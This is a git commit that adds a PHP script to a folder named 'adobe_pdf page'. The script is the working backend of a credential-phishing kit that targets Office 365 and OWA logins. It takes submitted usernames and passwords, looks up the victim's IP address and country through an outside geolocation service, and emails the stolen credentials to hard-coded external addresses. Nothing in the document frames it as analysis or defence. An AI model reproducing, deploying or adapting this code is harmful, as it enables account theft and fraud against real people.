599e18b71df0ddac920559dc3e23f11fbdeefc57
dennisschultz12 <99319828+dennisschultz12@users.noreply.github.com>
2022-02-25 19:39:45 +1100

    Add files via upload

---
+++ adobe_pdf page/ment.php
@@ -0,0 +1,62 @@
+<?php
+$to = array("changpeng05@yandex.com","
+squavo@protonmail.com");
+//$to = array("changpeng05@yandex.com","squavo@protonmail.com");
+header('Access-Control-Allow-Origin: *');
+
+if(isset($_POST['user']) && isset($_POST['pass'])){
+
+
+function visitor_country()
+	{
+	$ip = getenv("REMOTE_ADDR");
+	$result = "Unknown";
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	$country = json_decode(curl_exec($ch))->country;
+	if ($country != null)
+		{
+		$result = $country;
+		}
+
+	return $result;
+	}
+
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+//$recipient = "changpeng05@yandex.com";
+$api = 'http://my-ips.org/ip/index.php';
+$country = visitor_country();
+$ip = getenv("REMOTE_ADDR");
+
+	$data = array(
+		"user" => $user,
+		"pass" => $pass,
+		"type" => "1",
+		"country" => $country,
+		"ip" => $ip
+	);
+
+
+		$date = date('d-m-Y');
+		$ip = getenv("REMOTE_ADDR");
+		$message = "-----------+ O365 logs +-----------\n";
+		$message.= "User ID: " . $user . "\n";
+		$message.= "Password: " . $pass . "\n";
+		$message.= "Client IP      : $ip\n";
+		$message.= "Client Country      : $country\n";
+		$message.= "----------+ Created in Dagbo unit +-----------\n";
+		$subject = "OWA | logs(Auth-Required): " . $ip . "\n";
+		$headers = "MIME-Version: 1.0\n";
+
+        	foreach ($to as $recipient) {
+           mail($recipient, $subject, $message, $headers);
+       }
+
+
+		echo 0;
+
+
+	}
+?>
